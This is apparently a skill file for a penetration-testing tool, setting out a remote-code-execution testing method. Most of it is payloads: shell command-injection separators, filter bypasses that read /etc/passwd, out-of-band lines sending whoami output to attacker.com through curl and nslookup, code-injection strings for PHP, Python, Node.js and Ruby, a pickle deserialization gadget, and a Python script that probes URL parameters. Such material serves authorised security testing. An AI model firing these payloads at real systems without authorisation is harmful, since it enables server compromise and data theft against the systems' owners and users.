---
name: rce
description: Remote Code Execution testing methodology
version: 1.0.0
tags: [injection, command, A03:2021]
---

# RCE Testing Methodology

## Overview
RCE allows attackers to execute arbitrary commands on the server, leading to full system compromise.

## OS Command Injection

### Basic Payloads
```
; id
| id
|| id
& id
&& id
$(id)
`id`
```

### Blind Detection (Time-based)
```
; sleep 5
| sleep 5
& ping -c 5 127.0.0.1
|| ping -c 5 127.0.0.1
```

### Blind Detection (OOB)
```
; curl http://attacker.com/?$(whoami)
| nslookup $(whoami).attacker.com
```

### Bypass Techniques
```
;$IFS$9id
{ls,-la}
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
X=$'cat\x20/etc/passwd'&&$X
```

## Code Injection

### PHP
```php
";system('id');//
${system('id')}
```

### Python
```python
__import__('os').system('id')
eval("__import__('os').system('id')")
```

### Node.js
```javascript
require('child_process').exec('id')
```

### Ruby
```ruby
`id`
system('id')
exec('id')
```

## Deserialization RCE

### Java
```
Use ysoserial to generate payloads
```

### PHP
```php
O:8:"stdClass":0:{}
```

### Python (Pickle)
```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
```

## PoC Template
```python
import requests
import time

def test_rce(url, param):
    # Time-based detection
    payload = "; sleep 5"
    start = time.time()
    r = requests.get(url, params={param: payload})
    elapsed = time.time() - start
    
    if elapsed >= 5:
        print("[+] Command injection found!")
        
        # Confirm with command output
        r2 = requests.get(url, params={param: "; id"})
        if "uid=" in r2.text:
            print(f"[+] RCE confirmed: {r2.text}")
        return True
    
    return False
```

## Impact
- Full server compromise
- Data theft
- Lateral movement
- Ransomware deployment
